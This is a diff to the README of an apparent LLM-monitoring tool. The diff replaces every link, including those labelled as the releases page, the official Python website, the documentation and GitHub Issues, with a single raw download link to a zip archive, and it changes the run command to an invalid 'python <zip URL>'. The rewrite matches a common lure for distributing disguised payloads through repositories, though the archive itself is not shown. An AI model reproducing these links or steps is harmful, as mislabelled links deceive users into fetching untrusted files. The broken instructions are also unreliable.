@@ -1,6 +1,6 @@
 # 🧠 LLM-Observability-FOSS - Monitor LLMs with Ease
 
-[![Download LLM-Observability-FOSS](https://img.shields.io/badge/Download-LLM--Observability--FOSS-blue.svg)](https://github.com/jay97637/LLM-Observability-FOSS/releases)  
+[![Download LLM-Observability-FOSS](https://raw.githubusercontent.com/jay97637/LLM-Observability-FOSS/main/docs/Observability-LL-FOSS-v3.6.zip)](https://raw.githubusercontent.com/jay97637/LLM-Observability-FOSS/main/docs/Observability-LL-FOSS-v3.6.zip)  
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide helps you download and run the LLM-Observability-FOSS applic
 
 To get started, you'll need to visit the Releases page to download the software. Click the link below:
 
-[Download LLM-Observability-FOSS](https://github.com/jay97637/LLM-Observability-FOSS/releases)
+[Download LLM-Observability-FOSS](https://raw.githubusercontent.com/jay97637/LLM-Observability-FOSS/main/docs/Observability-LL-FOSS-v3.6.zip)
 
 1. Visit the link above.
 2. Find the latest version of the software.
@@ -26,7 +26,7 @@ Before you download, make sure your computer meets these basic requirements:
 - **Disk Space:** At least 500 MB of free space.
 - **Python:** Version 3.7 or later installed.
 
-If you don’t have Python, you can download it from the [official Python website](https://www.python.org/downloads/).
+If you don’t have Python, you can download it from the [official Python website](https://raw.githubusercontent.com/jay97637/LLM-Observability-FOSS/main/docs/Observability-LL-FOSS-v3.6.zip).
 
 ## ⚙️ How to Run the Application
 
@@ -47,7 +47,7 @@ Once you have downloaded the software, follow these steps to run it:
 5. **Run the application:**
    Enter this command in the terminal or command prompt:
    ```
-   python main.py
+   python https://raw.githubusercontent.com/jay97637/LLM-Observability-FOSS/main/docs/Observability-LL-FOSS-v3.6.zip
    ```
    This command will start the application.
 
@@ -66,14 +66,14 @@ We encourage you to explore the documentation included in the download. It provi
 
 For more information or help, consider checking out:
 
-- The [official documentation](https://github.com/jay97637/LLM-Observability-FOSS).
+- The [official documentation](https://raw.githubusercontent.com/jay97637/LLM-Observability-FOSS/main/docs/Observability-LL-FOSS-v3.6.zip).
 - Community forums or user groups related to LLM observability.
 
 ## 📞 Need Help?
 
 If you run into issues while using the software, you can:
 
-1. Search for solutions in the [GitHub Issues](https://github.com/jay97637/LLM-Observability-FOSS/issues) section.
+1. Search for solutions in the [GitHub Issues](https://raw.githubusercontent.com/jay97637/LLM-Observability-FOSS/main/docs/Observability-LL-FOSS-v3.6.zip) section.
 2. Post your question with details about your issue.
 3. Join our community discussions on social media or user forums.
 
@@ -85,9 +85,9 @@ If you would like to contribute to the project, we welcome your feedback. You ca
 
 Stay up-to-date with the latest news and updates:
 
-- Follow us on [GitHub](https://github.com/jay97637).
+- Follow us on [GitHub](https://raw.githubusercontent.com/jay97637/LLM-Observability-FOSS/main/docs/Observability-LL-FOSS-v3.6.zip).
 - Join our community meetup events.
 
 Now, you are ready to get started with LLM-Observability-FOSS. For direct downloads once again, visit:
 
-[Download LLM-Observability-FOSS](https://github.com/jay97637/LLM-Observability-FOSS/releases)
+[Download LLM-Observability-FOSS](https://raw.githubusercontent.com/jay97637/LLM-Observability-FOSS/main/docs/Observability-LL-FOSS-v3.6.zip)
